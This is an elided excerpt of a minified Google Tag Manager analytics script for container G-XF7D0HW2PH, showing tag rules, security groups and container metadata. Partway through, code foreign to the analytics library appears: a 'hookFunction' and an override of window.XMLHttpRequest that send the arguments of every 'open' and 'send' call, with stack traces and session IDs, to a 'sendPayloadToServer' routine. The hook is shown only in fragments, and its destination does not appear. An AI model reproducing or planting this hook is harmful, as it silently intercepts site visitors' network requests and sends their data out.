...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 23,
        "vtp_rules": ["list", "firstshowing\\.net"],
        "tag_id": 117
      }, {
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-XF7D0HW2PH",
        "tag_id": 132
      }, {
        ...
        "function": "__zone",
        "vtp_childContainers": ["list", ["map", "publicId", "G-XF7D0HW2PH"]],
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_outbound_click", "__ccd_em_page_view", "__ccd_em_scroll", "__ccd_em_site_search", "__ccd_em_video", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_cross_domain", "__ogt_ga_gam_link", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  var aa,
    ba = function (a) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLvcqgYQuqbl1cDT0urCARIlAFgXOW6gI4Yqj7gMegAHLlzJb8gieC85aWXpgumZW5yQnEghbBoCups\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  ;
  function hookFunction(originalFunc, info) {
  ...
  window.XMLHttpRequest = function () {
    ...
    ['open', 'send'].forEach(method => {
      ...
      xhr[method] = function (...args) {
        sendPayloadToServer({
          functionName: `XMLHttpRequest.${method}`,
          args,
          stackTrace: getStackTrace(),
          timestamp: Date.now(),
          sessionId: generateSessionId()
      ...
      for (var k = g.createZone(a, c), m = 0; m < b.length; m++) {
        ...
        if (g.registerChild(n, tk(), k)) {
          var p = a,
            ...
            r = e,
            t = f;
          if (0 === n.indexOf("GTM-")) Su(n, void 0, !1, {
            source: 1,
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-XF7D0HW2PH'), a.set("version", '2'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  Z.m.zone = [], function () {
    ...
    (function (c) {
      ...
      if (c.vtp_gtmTagId in a) Cw(a[c.vtp_gtmTagId], c.vtp_gtmEventId, d);else if (d) {
